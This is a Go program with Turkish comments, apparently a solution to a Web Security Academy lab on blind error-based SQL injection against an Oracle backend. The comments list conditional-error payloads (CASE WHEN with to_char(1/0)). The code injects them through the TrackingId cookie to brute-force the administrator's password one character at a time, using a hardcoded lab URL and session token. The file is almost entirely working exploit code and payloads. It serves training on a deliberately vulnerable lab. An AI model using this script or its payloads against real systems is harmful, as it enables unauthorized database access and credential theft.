package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
)

//burp suite ile gönderdiğimiz "aaa'AND (SELECT CASE WHEN((SELECT count(*) FROM users WHERE username='administrator') = 1) THEN 'a' ELSE to_char(1/0) END FROM dual)='a"
//200 OK değerinin dönmesi ile anladık
//burada ki ifade şu eğer username alanı administrator olan bir kayıt users tablosunda var ise 1 döndürecek ve o da CASE WHEN in ikinci koşulu olan 1 e eşit olacağı için
//CASE WHEN den true değeri gelecek
//CASE WHEN den true gelirse a değerini ekrana basacak ve bir sorun olmayacak 200 ok dönecek
//CASE WHEN den false döner ise 1/0 dan 0 a bölünemez hatası çıkacak db den ve internal server a dönecek

//burp suite intrueder den aaa'AND (SELECT CASE WHEN((SELECT SUBSTR(password, 1, 1)  FROM users WHERE username='administrator') = 'j') THEN 'a' ELSE to_char(1/0) END FROM dual)='a
//payloadının 200 ok döndürdüğünü gördüm ve şifrenin ilk değerinin j olduğunu anladım

//aaa'AND (SELECT CASE WHEN((SELECT LENGTH(password)  FROM users WHERE username='administrator') = 20) THEN 'a' ELSE to_char(1/0) END FROM dual)='a
//şifrenin 20 karakter olduğunu onaylayan payload
var (
	url_       = "https://acbf1f611f6e1a3ac0aa1f2400ff005e.web-security-academy.net/"
	keylist    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	TrackingId = "tWNNK4IK3DprMvjh"
	session    = "LF190LdgHwZV8GEDO06k9VKpiL0fLKAP"
)

func main() {
	pentest()
}

func pentest() {
	pass := ""
	for ok := true; ok; ok = (len(pass) != 20) {
		for _, c := range keylist {
			res := sendReq("aaa'AND (SELECT CASE WHEN((SELECT SUBSTR(password, 1, " + strconv.Itoa((len(pass) + 1)) + ")  FROM users WHERE username='administrator') = '" + pass + string(c) + "') THEN 'a' ELSE to_char(1/0) END FROM dual)='a")
			if res {
				pass += string(c)
				fmt.Println("Success : " + pass)
				break
			}
		}
	}
}

func sendReq(payload string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url_, nil)

	req.Header.Add("Cookie", "TrackingId="+payload+";session="+session)

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(payload)
	return (string(res.Status) == "200 OK")

}
